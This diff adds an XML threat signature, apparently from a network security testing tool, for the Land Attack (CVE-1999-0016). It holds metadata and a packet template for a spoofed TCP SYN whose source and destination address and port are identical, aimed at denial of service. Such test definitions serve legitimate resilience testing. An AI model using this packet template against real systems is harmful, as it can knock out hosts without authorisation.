@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <SoftwareRevision display="true" value="1.4"/>
+    <ExecDesc value="Land Attack" display="true"/>
+    <EngDesc value="This threat sends a spoofed TCP SYN packet with the same source and destination IP and port. This causes the target machine to potentially respond in an undesirable way." display="true"/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol value="TCP" display="true"/>
+    <Type_Of_Equipment value="Protocol" display="true"/>
+    <Known_Vendors_Affected display="true">
+      <item value="ALL"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Transport_Layer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="ALL"/>
+    </Known_Versions_Affected>
+    <Credit value="http://www.insecure.org/sploits/land.ip.DOS.html" display="true"/>
+    <CVEID display="true" value="CVE-1999-0016"/>
+    <bugtraqID display="true" value="2666"/>
+    <OSVDB display="true" value="14789"/>
+    <Author value="Chuck McAuley" display="true"/>
+    <ID value="000000ff464e8e8a00a900fe009b00c961bac205" display="true"/>
+    <Revision value="1" display="true"/>
+    <Suite display="true" value="Standard"/>
+    <AccessVector value="remote"/>
+    <AccessComplexity value="low"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="none"/>
+    <IntegImpact value="none"/>
+    <AvailImpact value="partial"/>
+    <ImpactBias value="normal"/>
+    <Created value="1139462165" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$destMAC" destMac="$destMAC" pktType="0800" Payload="">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="40" Protocol="6" HeaderChecksum="" srcIP="$destIP" destIP="$destIP" options="" Payload="" CE="false" DF="true" MF="false">
+        <TCP srcPort="$destPort" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="0" HeaderLength="" WindowSize="@random(1000,4000)" Checksum="" UrgentPointer="" Options="" Payload="" CWR="false" ECE="false" URG="false" ACK="false" PSH="false" RST="false" SYN="true" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
